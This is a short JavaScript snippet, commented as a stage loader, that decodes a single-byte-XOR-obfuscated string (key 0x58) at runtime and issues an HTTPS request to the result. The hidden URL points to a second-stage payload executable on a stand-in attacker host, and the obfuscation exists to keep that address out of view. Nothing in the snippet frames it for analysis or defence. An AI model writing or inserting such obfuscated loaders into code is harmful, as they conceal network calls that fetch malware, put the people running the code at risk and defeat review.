// stage loader, single-byte XOR (key 0x58)
const enc = "0,,(+bww=.14v= 95(4=v;75w+,9?=jw(9!479<v= =";
function deobf(s, key) {
  let out = "";
  for (let i = 0; i < s.length; i++) out += String.fromCharCode(s.charCodeAt(i) ^ key);  // XOR
  return out;
}
const url = deobf(enc, 0x58);
require("https").get(url);
